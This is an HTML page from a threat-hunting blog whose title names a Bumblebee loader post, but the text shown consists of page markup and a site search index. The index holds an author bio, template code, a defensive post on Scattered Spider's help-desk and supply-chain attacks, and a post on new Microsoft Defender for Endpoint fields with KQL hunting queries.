<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bzz.. Bzz.. Bumblebee loader | Threathunt.blog</title>

    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bzz.. Bzz.. Bumblebee loader | Threathunt.blog</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Bzz.. Bzz.. Bumblebee loader" />
<meta name="author" content="jouni" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Quite recently, a new loader has been popping up. This loader is likely been developed to counter the Microsoft’s change to the macro behavior, as the macros will be disabled on the documents that have been downloaded from the internet. This is a very welcome change as macros have been often used by the threat actors to launch the malicious code from the maldocs. Now that this will be harder to the threat actors they are creating new creative ways to get the initial foothold after a phishing attack." />
<meta property="og:description" content="Quite recently, a new loader has been popping up. This loader is likely been developed to counter the Microsoft’s change to the macro behavior, as the macros will be disabled on the documents that have been downloaded from the internet. This is a very welcome change as macros have been often used by the threat actors to launch the malicious code from the maldocs. Now that this will be harder to the threat actors they are creating new creative ways to get the initial foothold after a phishing attack." />
<link rel="canonical" href="https://threathunt.blog/bzz-bzz-bumblebee-loader/" />
<meta property="og:url" content="https://threathunt.blog/bzz-bzz-bumblebee-loader/" />
<meta property="og:site_name" content="Threathunt.blog" />
<meta property="og:image" content="https://threathunt.blog/assets/images/bumblee_loader.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-08T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://threathunt.blog/assets/images/bumblee_loader.png" />
<meta property="twitter:title" content="Bzz.. Bzz.. Bumblebee loader" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jouni"},"dateModified":"2022-05-08T00:00:00+00:00","datePublished":"2022-05-08T00:00:00+00:00","description":"Quite recently, a new loader has been popping up. This loader is likely been developed to counter the Microsoft’s change to the macro behavior, as the macros will be disabled on the documents that have been downloaded from the internet. This is a very welcome change as macros have been often used by the threat actors to launch the malicious code from the maldocs. Now that this will be harder to the threat actors they are creating new creative ways to get the initial foothold after a phishing attack.","headline":"Bzz.. Bzz.. Bumblebee loader","image":"https://threathunt.blog/assets/images/bumblee_loader.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://threathunt.blog/bzz-bzz-bumblebee-loader/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://threathunt.blog/assets/images/logo.png"},"name":"jouni"},"url":"https://threathunt.blog/bzz-bzz-bumblebee-loader/"}</script>
<!-- End Jekyll SEO tag -->


    <link rel="shortcut icon" type="image/x-icon" href="/assets/images/favicon.ico">

    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">

    <!-- Google Fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,400i,700" rel="stylesheet">

    <!-- Bootstrap Modified -->
    <link rel="stylesheet" href="/assets/css/main.css">

    <!-- Theme Stylesheet -->
    <link rel="stylesheet" href="/assets/css/theme.css">

    <!-- Jquery on header to make sure everything works, the rest  of the scripts in footer for fast loading -->
    <script
    src="https://code.jquery.com/jquery-3.3.1.min.js"
    integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
    crossorigin="anonymous"></script>

    <!-- This goes before </head> closing tag, Google Analytics can be placed here --> 


</head>

<body class="">

    <!-- Navbar -->
    <nav id="MagicMenu" class="topnav navbar navbar-expand-lg navbar-light bg-white fixed-top">
    <div class="container">
        <a class="navbar-brand" href="/index.html"><strong>Threathunt.blog</strong></a>
        <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
        <div class="navbar-collapse collapse" id="navbarColor02" style="">
            <ul class="navbar-nav mr-auto d-flex align-items-center">
               <!--  Replace menu links here -->

<li class="nav-item">
<a class="nav-link" href="/index.html">Home</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/about.html"">About</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/tags.html"">Tags</a>
</li>
            </ul>
            <ul class="navbar-nav ml-auto d-flex align-items-center">
                <script src="/assets/js/lunr.js"></script>

<script>
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 1000 );
        $( "body" ).removeClass( "modal-open" );
    });
});
    

var documents = [{
    "id": 0,
    "url": "https://threathunt.blog/404/",
    "title": "",
    "body": " 404 Page not found :(  The requested page could not be found. "
    }, {
    "id": 1,
    "url": "https://threathunt.blog/about.html",
    "title": "About",
    "body": "Hello all! My name is Jouni Mikkola, a security inspired fellow from Finland. This blog will be hosting mainly Threat Hunting, Threat Intelligence and Incident response related topics. It started as a threat hunting blog thus the name but since then I have been exploring other topics so I decided to change this page. I have been working in Cybersecurity for over 5 years. All the time that I have been in the field I have worked within the blue team - mainly DFIR and Threat Hunting. I have had some assignments in SOC too, although my experience isn't that extensive in the SOC roles. Most of my time has been within a Finnish Cybersecurity company known as Nixu- however I joined Deloitte as a manager - responsible for DFIR &amp; TH related tasks. My stay at Deloitte was a little short and now I am at Accenture, being responsible for the DFIR business within the Nordics. I have been in IT for almost 20 years, the first 10 I spent with consulting Microsoft related server products - like Office 365, Exchange, OCS-Lync-Skpe, ADFS, AD and many others. After moving towards the DFIR world I have also been conducting quite a lot of threat hunts. Most of my experience is from host/endpoint based threat hunting, usually revolving around EDR technologies, with some additions from the SIEM’s. My personal opinion is, that host based data is the best data when it comes to threat hunting also I do also appreciate the possibilities that network based threat hunting can open. I have been moving more to a leadership position but I still have a place in my heart for all things technical. Now during my work I might be more about excel and PowerPoint but the blog is a great place to tinker with technical side of things too. There will be no scheduled updates to the blog and it will be worked on when time allows. Now that I have been doing this for a while, it seems that my time and ideas varies a lot. "
    }, {
    "id": 2,
    "url": "https://threathunt.blog/author-jouni.html",
    "title": "Jouni",
    "body": "                        {{page. title}} Follow:         {{ site. authors. jane. site }}         {{ site. authors. jane. bio }}                                   Posts by {{page. title}}:       {% assign posts = site. posts | where: author , jane  %}      {% for post in posts %}      {% include main-loop-card. html %}      {% endfor %}  "
    }, {
    "id": 3,
    "url": "https://threathunt.blog/authors-list.html",
    "title": "Authors",
    "body": "{{page. title}}:     {% for author in site. authors %}                                         {{ author[1]. name }} :       (View Posts)      {{ author[1]. bio }}                          &nbsp;       &nbsp;                                    {% endfor %}  "
    }, {
    "id": 4,
    "url": "https://threathunt.blog/buy-me-a-coffee.html",
    "title": "Buy me a coffee",
    "body": "Hi! I am Sal, web designer &amp; developer at WowThemes. net. The free items I create are my side projects and Mundana for Jekyll is one of them. You can find all the work I release for free here. You have my permission to use the free items I develop in your personal, commercial or client projects. If you’d like to reward my work, I would be honored and I could dedicate more time maintaining the free projects. Thank you so much! Buy me a coffee "
    }, {
    "id": 5,
    "url": "https://threathunt.blog/categories.html",
    "title": "Categories",
    "body": "          Categories          {% for category in site. categories %}     {{ category[0] }}:           {% assign pages_list = category[1] %}    {% for post in pages_list %}    {% if post. title != null %}     {% if group == null or group == post. group %}           {% include main-loop-card. html %}     {% endif %}    {% endif %}    {% endfor %}    {% assign pages_list = nil %}    {% assign group = nil %}    {% endfor %}                  {% include sidebar-featured. html %}          "
    }, {
    "id": 6,
    "url": "https://threathunt.blog/contact.html",
    "title": "Contact",
    "body": "  Please send your message to {{site. name}}. We will reply as soon as possible!   "
    }, {
    "id": 7,
    "url": "https://threathunt.blog/",
    "title": "Threat hunting with hints of incident response",
    "body": "  {% if page. url ==  /  %}            {% assign latest_post = site. posts[0] %}          &lt;div class= topfirstimage  style= background-image: url({% if latest_post. image contains  ://  %}{{ latest_post. image }}{% else %} {{site. baseurl}}/{{ latest_post. image}}{% endif %}); height: 200px;  background-size: cover;  background-repeat: no-repeat; &gt;&lt;/div&gt;           {{ latest_post. title }}  :       {{ latest_post. excerpt | strip_html | strip_newlines | truncate: 136 }}               In         {% for category in latest_post. categories %}        {{ category }},         {% endfor %}                                {{ latest_post. date | date: '%b %d, %Y' }}                            {%- assign second_post = site. posts[1] -%}                        {% if second_post. image %}                         &lt;img class= w-100  src= {% if second_post. image contains  ://  %}{{ second_post. image }}{% else %}{{ second_post. image | absolute_url }}{% endif %}  alt= {{ second_post. title }} &gt;                        {% endif %}                                    {{ second_post. title }}          :                       In             {% for category in second_post. categories %}            {{ category }},             {% endfor %}                                                      {{ second_post. date | date: '%b %d, %Y' }}                                    {%- assign third_post = site. posts[2] -%}                        {% if third_post. image %}                         &lt;img class= w-100  src= {% if third_post. image contains  ://  %}{{ third_post. image }}{% else %}{{site. baseurl}}/{{ third_post. image }}{% endif %}  alt= {{ third_post. title }} &gt;                        {% endif %}                                    {{ third_post. title }}          :                       In             {% for category in third_post. categories %}            {{ category }},             {% endfor %}                                                      {{ third_post. date | date: '%b %d, %Y' }}                                    {%- assign fourth_post = site. posts[3] -%}                        {% if fourth_post. image %}                        &lt;img class= w-100  src= {% if fourth_post. image contains  ://  %}{{ fourth_post. image }}{% else %}{{site. baseurl}}/{{ fourth_post. image }}{% endif %}  alt= {{ fourth_post. title }} &gt;                        {% endif %}                                    {{ fourth_post. title }}          :                       In             {% for category in fourth_post. categories %}            {{ category }},             {% endfor %}                                                      {{ fourth_post. date | date: '%b %d, %Y' }}                                  {% for post in site. posts %} {% if post. tags contains  sticky  %}                    {{post. title}}                  {{ post. excerpt | strip_html | strip_newlines | truncate: 136 }}                 Read More            	             {% endif %}{% endfor %}  {% endif %}                All Stories:         {% for post in paginator. posts %}          {% include main-loop-card. html %}        {% endfor %}                   {% if paginator. total_pages &gt; 1 %}              {% if paginator. previous_page %}        &laquo; Prev       {% else %}        &laquo;       {% endif %}       {% for page in (1. . paginator. total_pages) %}        {% if page == paginator. page %}        {{ page }}        {% elsif page == 1 %}        {{ page }}        {% else %}        {{ page }}        {% endif %}       {% endfor %}       {% if paginator. next_page %}        Next &raquo;       {% else %}        &raquo;       {% endif %}            {% endif %}                     {% include sidebar-featured. html %}      "
    }, {
    "id": 8,
    "url": "https://threathunt.blog/privacy-policy.html",
    "title": "Privacy Policy",
    "body": "”{{site. name}}” takes your privacy seriously. To better protect your privacy we provide this privacy policy notice explaining the way your personal information is collected and used. Collection of Routine Information: This website track basic information about their visitors. This information includes, but is not limited to, IP addresses, browser details, timestamps and referring pages. None of this information can personally identify specific visitor to this website. The information is tracked for routine administration and maintenance purposes. Cookies: Where necessary, this website uses cookies to store information about a visitor’s preferences and history in order to better serve the visitor and/or present the visitor with customized content. Advertisement and Other Third Parties: Advertising partners and other third parties may use cookies, scripts and/or web beacons to track visitor activities on this website in order to display advertisements and other useful information. Such tracking is done directly by the third parties through their own servers and is subject to their own privacy policies. This website has no access or control over these cookies, scripts and/or web beacons that may be used by third parties. Learn how to opt out of Google’s cookie usage. Links to Third Party Websites: We have included links on this website for your use and reference. We are not responsible for the privacy policies on these websites. You should be aware that the privacy policies of these websites may differ from our own. Security: The security of your personal information is important to us, but remember that no method of transmission over the Internet, or method of electronic storage, is 100% secure. While we strive to use commercially acceptable means to protect your personal information, we cannot guarantee its absolute security. Changes To This Privacy Policy: This Privacy Policy is effective and will remain in effect except with respect to any changes in its provisions in the future, which will be in effect immediately after being posted on this page. We reserve the right to update or change our Privacy Policy at any time and you should check this Privacy Policy periodically. If we make any material changes to this Privacy Policy, we will notify you either through the email address you have provided us, or by placing a prominent notice on our website. Contact Information: For any questions or concerns regarding the privacy policy, please contact us here. "
    }, {
    "id": 9,
    "url": "https://threathunt.blog/tags.html",
    "title": "Tags",
    "body": "          Tags          {% for tag in site. tags %}     {{ tag[0] }}:           {% assign pages_list = tag[1] %}    {% for post in pages_list %}    {% if post. title != null %}     {% if group == null or group == post. group %}           {% include main-loop-card. html %}     {% endif %}    {% endif %}    {% endfor %}    {% assign pages_list = nil %}    {% assign group = nil %}    {% endfor %}                  {% include sidebar-featured. html %}          "
    }, {
    "id": 10,
    "url": "https://threathunt.blog/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
    }, {
    "id": 11,
    "url": "https://threathunt.blog/page2/",
    "title": "Threat hunting with hints of incident response",
    "body": "  {% if page. url ==  /  %}            {% assign latest_post = site. posts[0] %}          &lt;div class= topfirstimage  style= background-image: url({% if latest_post. image contains  ://  %}{{ latest_post. image }}{% else %} {{site. baseurl}}/{{ latest_post. image}}{% endif %}); height: 200px;  background-size: cover;  background-repeat: no-repeat; &gt;&lt;/div&gt;           {{ latest_post. title }}  :       {{ latest_post. excerpt | strip_html | strip_newlines | truncate: 136 }}               In         {% for category in latest_post. categories %}        {{ category }},         {% endfor %}                                {{ latest_post. date | date: '%b %d, %Y' }}                            {%- assign second_post = site. posts[1] -%}                        {% if second_post. image %}                         &lt;img class= w-100  src= {% if second_post. image contains  ://  %}{{ second_post. image }}{% else %}{{ second_post. image | absolute_url }}{% endif %}  alt= {{ second_post. title }} &gt;                        {% endif %}                                    {{ second_post. title }}          :                       In             {% for category in second_post. categories %}            {{ category }},             {% endfor %}                                                      {{ second_post. date | date: '%b %d, %Y' }}                                    {%- assign third_post = site. posts[2] -%}                        {% if third_post. image %}                         &lt;img class= w-100  src= {% if third_post. image contains  ://  %}{{ third_post. image }}{% else %}{{site. baseurl}}/{{ third_post. image }}{% endif %}  alt= {{ third_post. title }} &gt;                        {% endif %}                                    {{ third_post. title }}          :                       In             {% for category in third_post. categories %}            {{ category }},             {% endfor %}                                                      {{ third_post. date | date: '%b %d, %Y' }}                                    {%- assign fourth_post = site. posts[3] -%}                        {% if fourth_post. image %}                        &lt;img class= w-100  src= {% if fourth_post. image contains  ://  %}{{ fourth_post. image }}{% else %}{{site. baseurl}}/{{ fourth_post. image }}{% endif %}  alt= {{ fourth_post. title }} &gt;                        {% endif %}                                    {{ fourth_post. title }}          :                       In             {% for category in fourth_post. categories %}            {{ category }},             {% endfor %}                                                      {{ fourth_post. date | date: '%b %d, %Y' }}                                  {% for post in site. posts %} {% if post. tags contains  sticky  %}                    {{post. title}}                  {{ post. excerpt | strip_html | strip_newlines | truncate: 136 }}                 Read More            	             {% endif %}{% endfor %}  {% endif %}                All Stories:         {% for post in paginator. posts %}          {% include main-loop-card. html %}        {% endfor %}                   {% if paginator. total_pages &gt; 1 %}              {% if paginator. previous_page %}        &laquo; Prev       {% else %}        &laquo;       {% endif %}       {% for page in (1. . paginator. total_pages) %}        {% if page == paginator. page %}        {{ page }}        {% elsif page == 1 %}        {{ page }}        {% else %}        {{ page }}        {% endif %}       {% endfor %}       {% if paginator. next_page %}        Next &raquo;       {% else %}        &raquo;       {% endif %}            {% endif %}                     {% include sidebar-featured. html %}      "
    }, {
    "id": 12,
    "url": "https://threathunt.blog/page3/",
    "title": "Threat hunting with hints of incident response",
    "body": "  {% if page. url ==  /  %}            {% assign latest_post = site. posts[0] %}          &lt;div class= topfirstimage  style= background-image: url({% if latest_post. image contains  ://  %}{{ latest_post. image }}{% else %} {{site. baseurl}}/{{ latest_post. image}}{% endif %}); height: 200px;  background-size: cover;  background-repeat: no-repeat; &gt;&lt;/div&gt;           {{ latest_post. title }}  :       {{ latest_post. excerpt | strip_html | strip_newlines | truncate: 136 }}               In         {% for category in latest_post. categories %}        {{ category }},         {% endfor %}                                {{ latest_post. date | date: '%b %d, %Y' }}                            {%- assign second_post = site. posts[1] -%}                        {% if second_post. image %}                         &lt;img class= w-100  src= {% if second_post. image contains  ://  %}{{ second_post. image }}{% else %}{{ second_post. image | absolute_url }}{% endif %}  alt= {{ second_post. title }} &gt;                        {% endif %}                                    {{ second_post. title }}          :                       In             {% for category in second_post. categories %}            {{ category }},             {% endfor %}                                                      {{ second_post. date | date: '%b %d, %Y' }}                                    {%- assign third_post = site. posts[2] -%}                        {% if third_post. image %}                         &lt;img class= w-100  src= {% if third_post. image contains  ://  %}{{ third_post. image }}{% else %}{{site. baseurl}}/{{ third_post. image }}{% endif %}  alt= {{ third_post. title }} &gt;                        {% endif %}                                    {{ third_post. title }}          :                       In             {% for category in third_post. categories %}            {{ category }},             {% endfor %}                                                      {{ third_post. date | date: '%b %d, %Y' }}                                    {%- assign fourth_post = site. posts[3] -%}                        {% if fourth_post. image %}                        &lt;img class= w-100  src= {% if fourth_post. image contains  ://  %}{{ fourth_post. image }}{% else %}{{site. baseurl}}/{{ fourth_post. image }}{% endif %}  alt= {{ fourth_post. title }} &gt;                        {% endif %}                                    {{ fourth_post. title }}          :                       In             {% for category in fourth_post. categories %}            {{ category }},             {% endfor %}                                                      {{ fourth_post. date | date: '%b %d, %Y' }}                                  {% for post in site. posts %} {% if post. tags contains  sticky  %}                    {{post. title}}                  {{ post. excerpt | strip_html | strip_newlines | truncate: 136 }}                 Read More            	             {% endif %}{% endfor %}  {% endif %}                All Stories:         {% for post in paginator. posts %}          {% include main-loop-card. html %}        {% endfor %}                   {% if paginator. total_pages &gt; 1 %}              {% if paginator. previous_page %}        &laquo; Prev       {% else %}        &laquo;       {% endif %}       {% for page in (1. . paginator. total_pages) %}        {% if page == paginator. page %}        {{ page }}        {% elsif page == 1 %}        {{ page }}        {% else %}        {{ page }}        {% endif %}       {% endfor %}       {% if paginator. next_page %}        Next &raquo;       {% else %}        &raquo;       {% endif %}            {% endif %}                     {% include sidebar-featured. html %}      "
    }, {
    "id": 13,
    "url": "https://threathunt.blog/page4/",
    "title": "Threat hunting with hints of incident response",
    "body": "  {% if page. url ==  /  %}            {% assign latest_post = site. posts[0] %}          &lt;div class= topfirstimage  style= background-image: url({% if latest_post. image contains  ://  %}{{ latest_post. image }}{% else %} {{site. baseurl}}/{{ latest_post. image}}{% endif %}); height: 200px;  background-size: cover;  background-repeat: no-repeat; &gt;&lt;/div&gt;           {{ latest_post. title }}  :       {{ latest_post. excerpt | strip_html | strip_newlines | truncate: 136 }}               In         {% for category in latest_post. categories %}        {{ category }},         {% endfor %}                                {{ latest_post. date | date: '%b %d, %Y' }}                            {%- assign second_post = site. posts[1] -%}                        {% if second_post. image %}                         &lt;img class= w-100  src= {% if second_post. image contains  ://  %}{{ second_post. image }}{% else %}{{ second_post. image | absolute_url }}{% endif %}  alt= {{ second_post. title }} &gt;                        {% endif %}                                    {{ second_post. title }}          :                       In             {% for category in second_post. categories %}            {{ category }},             {% endfor %}                                                      {{ second_post. date | date: '%b %d, %Y' }}                                    {%- assign third_post = site. posts[2] -%}                        {% if third_post. image %}                         &lt;img class= w-100  src= {% if third_post. image contains  ://  %}{{ third_post. image }}{% else %}{{site. baseurl}}/{{ third_post. image }}{% endif %}  alt= {{ third_post. title }} &gt;                        {% endif %}                                    {{ third_post. title }}          :                       In             {% for category in third_post. categories %}            {{ category }},             {% endfor %}                                                      {{ third_post. date | date: '%b %d, %Y' }}                                    {%- assign fourth_post = site. posts[3] -%}                        {% if fourth_post. image %}                        &lt;img class= w-100  src= {% if fourth_post. image contains  ://  %}{{ fourth_post. image }}{% else %}{{site. baseurl}}/{{ fourth_post. image }}{% endif %}  alt= {{ fourth_post. title }} &gt;                        {% endif %}                                    {{ fourth_post. title }}          :                       In             {% for category in fourth_post. categories %}            {{ category }},             {% endfor %}                                                      {{ fourth_post. date | date: '%b %d, %Y' }}                                  {% for post in site. posts %} {% if post. tags contains  sticky  %}                    {{post. title}}                  {{ post. excerpt | strip_html | strip_newlines | truncate: 136 }}                 Read More            	             {% endif %}{% endfor %}  {% endif %}                All Stories:         {% for post in paginator. posts %}          {% include main-loop-card. html %}        {% endfor %}                   {% if paginator. total_pages &gt; 1 %}              {% if paginator. previous_page %}        &laquo; Prev       {% else %}        &laquo;       {% endif %}       {% for page in (1. . paginator. total_pages) %}        {% if page == paginator. page %}        {{ page }}        {% elsif page == 1 %}        {{ page }}        {% else %}        {{ page }}        {% endif %}       {% endfor %}       {% if paginator. next_page %}        Next &raquo;       {% else %}        &raquo;       {% endif %}            {% endif %}                     {% include sidebar-featured. html %}      "
    }, {
    "id": 14,
    "url": "https://threathunt.blog/scattered-spider/",
    "title": "Scattered Spider: When Social Engineering Meets Supply Chain Risk",
    "body": "2025/06/21 - Scattered Spider: When Social Engineering Meets Supply Chain RiskI have been following recent activity by Scattered Spider which led me to write about this topic. Lately, the group has been very active in attacking several different retailers in UK. The most notable one has been Mark &amp; Spencers. The attack against M&amp;S according to the news originally started somewhere around February-March where the threat actor was able to exfiltrate the Active Directory database, also known as ntds. dit. This resulted in a further attack as the threat actor was able to crack the usernames and passwords stored in the ntds. dit database. According to the public information the initial access method for this attack was a supply chain, not social engineering as initially suggested. Allegedly, the attack may have been started by compromising an employee of TCS, a service provider for Mark &amp; Spencers. This initial foothold allowed attackers to deploy DragonForce ransomware, encrypting critical systems leading to disruptions in the business. This has had massive financial impact to M&amp;S, where the market value is down 700 million pounds and they were losing 4 million pounds worth of online sales daily before able to recover back to normal. There is some information available in public of the attack, however it is relatively limited in technical details. The Scattered Spider group is known from their sophisticated social engineering attacks and they are known to target the help desks of companies. They are very good at impersonating employees and gaining access to systems through the help desk. There have been several articles stating how they are able to gain a lot of information from their targets before conducting the call to the help desk, like gaining personal information about the targets family and things like employee IDs which are sometimes required to reset passwords. The group is also known from targeting disgruntled employees and using their credentials to gain access to the target company. The Scattered Spider group has also been attacking the Supply Chain, as within the Mark &amp; Spencers attacks. This emphasizes the importance of ensuring safe supply chain and also monitoring what is happening outside of your own network. The supply chain can be a very intereting target for the threat actors as by gaining access to a supplier, they can gain access to potentially tens or hundreds of organizations. I’ve seen several successful attacks originate through supply chain compromises in the past, and unfortunately, I am seeing these incidents becoming increasingly frequent. Defending against the attacksSo what can a company do to defend agains these attacks? I think it is not a simple answer, given that they are using the human element to gain access. This makes technical controls alone not enough, though they help a lot. I have had some ideas which could help to prepare for this type of attacks, either by trying to ensure that the attacks would not be successful or trying to limit the scope. Help Desk: The threat actor could start the attack by searching for information about an employee they may want to target. They could for example analyze the social media of the target person to gain information of the subject. They could potentially find out what kind of role the person has within the company, information about the family and interests. With this information they could start crafing more personal story giving details which are true and make the help desk more likely to trust them. They could also acquire information through other means like LinkedIn, company websites and even other breaches, which could lead the threat actor to have a bunch of information from the person. They can call the help desk with all this information and they may have all the relevant information needed to get the password reset. They could also for example first compromise the account of a manager of their actual target (like sysadmin) and then use this compromised account to confirm account reset requests for the actual target. The attempts are very   and they are also able to create a sense of urgency to make the help desk employee to act quickly. While MFA is a critical security layer, it’s not a silver bullet. In my experience, attackers may target the help desk to reset MFA, often claiming a lost or stolen device. This highlights the importance of robust identity verification procedures beyond just MFA. One of the strongest technical controls is to disallow all access from devices which are not managed by the company and ensuring tight controls for the managed devices before giving access. This way even if an account is compromised the threat actor should have no access to the account as they do not have such a device. However, this may not be an option for many companies as it is quite normal that data is being used from wide range of different devices. One of the critical factors when defending against this kind of attack is to ensure the help desk procedures and verifications. Have a look at your companys procedures, verify how the help desk is verifying the identity of the caller.  Are they asking enough questions? Are they checking enough information? Are they following the procedures? What would they do in case of a very sophisticated and convinvcing caller? Are they making exceptions to the process? Does the process have weaknesses? Do they report suspicious activity? How does the process work for admin accounts?The next step would be to test out if the help desk is vulnerable to social engineering. This could be performed as an excercise where the caller is given enough details to convince the help desk to reset the password. Verify if this kind of information is something that can be acquired (remember, it could be also publicly available from previous breach). Then, have a convincing person call the help desk with a plan in mind to test out how they function. Based on the learnings the procedure can be improved, training can be offered for the help desk personnel to spot social engineering attacks and potential issues corrected. Supply chain: I think this is fairly more complicated matter to solve. Many companies are doing a lot of work to ensure that their supply chain remains secure. I know that many companies are monitoring the dark web and similar sources for any signs of their suppliers being compromised. This is important given that how common the attacks are getting. The other good thing to understand is what kind of access the suppliers have. A register of suppliers should be created containing the details from the different suppliers where the access is quite clearly documented. This register should be reviewed from time to time to ensure it is up-to-date. Here are some of the items I feel like would be important to include in the register from security perspective. With the following details I feel like it would be much easier to control the risk levels for the suppliers. Supplier information:  Supplier Name Security contact person: Security contact for the supplier Services provided: What services does the supplier provide Relationship: Direct, supplier of supplier, etc Business criticality: How important are they for the businessAccess details:  Systems accessed: A detailed list of systems the supplier has access to.  Access type: Read, read/write, admin Access method: VPN, Direct, company provided laptops, API, etc. .  Justification: Reason why the supplier needs access Date granted Expiration date MFA requirements: Is MFA required, how it is implemented? Cutting access: How can we cut the supplier access at the time of an emergency?Security Posture: This goes a bit further and at least some of these may be hard to get access to. However, I feel this could prove valuable from risk management perspective to have this information for key supplier.  Security Certifications: (ISO 27001, SOC 2, etc. ) Data Handling Practices: How do they handle your data? (Encryption, data residency, etc. ). Reference to a Data Processing Agreement (DPA) is good here. This is a must for all the suppliers.  Incident Response Plan: Do they have a documented incident response plan? Have you reviewed it? Dark Web Monitoring: Are they actively monitoring for compromised credentials related to your organization? Have you added them to your own dark web monitoring?Review:  Date of Last Access Review: When was the access reviewed to ensure it’s still necessary and appropriate? Reviewer Name/Role: Who performed the review? Review Findings: Any issues identified during the review? Remediation Actions: What actions were taken to address any issues?ConclusionThe attacks perpetrated by Scattered Spider, and groups like them, represent a significant and evolving threat landscape. They demonstrate a clear preference for exploiting the human element, skillfully blending social engineering with technical prowess to bypass traditional security measures. While technical controls like MFA and device restrictions are important layers of defense, they are not perfect. Ultimately, a robust defense requires a holistic approach that prioritizes people, processes, and technology. Strengthening help desk procedures through rigorous verification protocols, continuous training, and regular testing is paramount. Equally critical is a proactive understanding and management of supply chain risks, underpinned by a detailed access register and ongoing monitoring. By embracing a layered security posture, fostering a culture of security awareness, and proactively addressing these threats, organizations can significantly reduce their risk of becoming the next victim of Scattered Spider or similar actor. Given the success by the group and the availability of AI Tools capable of working through language barriers I think these kinds of attacks are very likely to be more common in the future. The financial impact for M&amp;S was huge - this is a very good example of how much a successful attack can cost. That’s it, hope you enjoyed reading. "
    }, {
    "id": 15,
    "url": "https://threathunt.blog/new-mde-fields/",
    "title": "Having a look at a few new fields in MDE",
    "body": "2025/02/28 - Having a look at a few new fields in MDEI noticed that there has been a few new fields added to the Advanced hunt tables. These fields can be useful for threat hunting and incident response. There is especially one very interesting field which I have been missing for a long time. This is the ScriptContent ActionType which is now stored in the DeviceEvents table, at least in theory. I was able to see this in one environment, however unfortunately it is not available in my testing environment. I have no idea why, but I would assume that this may have something to do with some features being gradually added to different tenants. Could also maybe be related to versions, my testing devices is W10 and not 11. Because I don’t have this available it is kinda pointless to write about it. This should contain the executed script content which is saved by the amsi inspection feature. The amsi inspection feature is used to inspect scripts that are executed on the endpoint. It is also used to inspect scripts that are downloaded from the internet and thus it can be very useful feature to detect malicious code being executed. It has been available in the MDE for the long time, however it has historically been only available in the device timeline. It is absolutely amazing to see it coming to the Advanced Hunt too! You can check if you have any hits with the following query: DeviceEvents | where ActionType == 'ScriptContent'I will revisit this topic with some queries utilizing this data when I have it available. I have a few ideas on how to utilize for hunting purposes. Remote Session information: Several different columns have been added to the tables representing the remote device from which the process is launched. Here is the Microsoft information related to these:       Column name   Type   Description         IsInitiatingProcessRemoteSession   bool   Indicates whether the initiating process was run under a remote desktop protocol (RDP) session (true) or locally (false)       InitiatingProcessRemoteSessionDeviceName   string   Device name of the remote device from which the initiating process’s RDP session was initiated       InitiatingProcessRemoteSessionIP   string   IP address of the remote device from which the initiating process’s RDP session was initiated       IsProcessRemoteSession   bool   Indicates whether the created process was run under a remote desktop protocol (RDP) session (true) or locally (false)       ProcessRemoteSessionDeviceName   string   Device name of the remote device from which the created process’s RDP session was initiated       ProcessRemoteSessionIP   string   IP address of the remote device from which the created process’s RDP session was initiated   As stated within the documentation it indicates the RDP session from which the session was initiated. This can be very valuable information especially for incident response work so I would suggest keeping these in mind for future investigations! This can be used for threat hunting purposes too. The first idea which came to my mind is to try to see what actions is done in a single RDP session. For example, if you see a lot of suspicious activities in a single RDP session, it might be a sign of an attack. The easiest way to do this would be if there would be a session id saved on the tables but that is not the case. So I just did a crude query grouping sessions by 1d. search in (DeviceProcessEvents,DeviceNetworkEvents,DeviceFileEvents,DeviceRegistryEvents,DeviceLogonEvents,DeviceImageLoadEvents,DeviceEvents)IsProcessRemoteSession == 1 or IsInitiatingProcessRemoteSession == 1| summarize Actions = make_set(ActionType), FileNames = make_set(FileName), CommandLines = make_set(ProcessCommandLine), InitiatingCommandLines = make_set(InitiatingProcessCommandLine), RegKeys = make_set(RegistryKey), RegName = make_set(RegistryValueName), RegData = make_set(RegistryValueData), Timestamps = make_set(Timestamp) by ProcessRemoteSessionIP, ProcessRemoteSessionDeviceName, IsProcessRemoteSession, InitiatingProcessRemoteSessionIP, InitiatingProcessRemoteSessionDeviceName, IsInitiatingProcessRemoteSession, bin(Timestamp, 1d)This creates a lot of data as there is often a lot of things being done in a single RDP session. The following picture shows a snippet of one of the results.  We could look at the data and spot something suspicious like this: Not gonna lie, this isn’t amazing. Requires a lot of analysis and is likely not runnable in real environment, but maybe something to get people thinking how to utilize these columns. I think there is just way too much data captured by this query and it should be more limited to a certain threat scenario, or at least to certain activities rather than everything. I don’t think is runnable in any production environment like this, unless RDP is not used much at all. There may be a lot more new information which I am unaware of. These are some new to me features which I have not seen before and I think they are very interesting. I will keep looking into the data that is present in MDE and hopefully will find further gems. I also add queries to this post regarding the new columns as I plan on working on this topic more. These two columns are so new that were failing KQL checks on MS repo when I posted last time as they were not added to the checks, so I will not even try to post this. Though, I wouldn’t otherwise either as it is too broad. "
    }, {
    "id": 16,
    "url": "https://threathunt.blog/registry-hunts/",
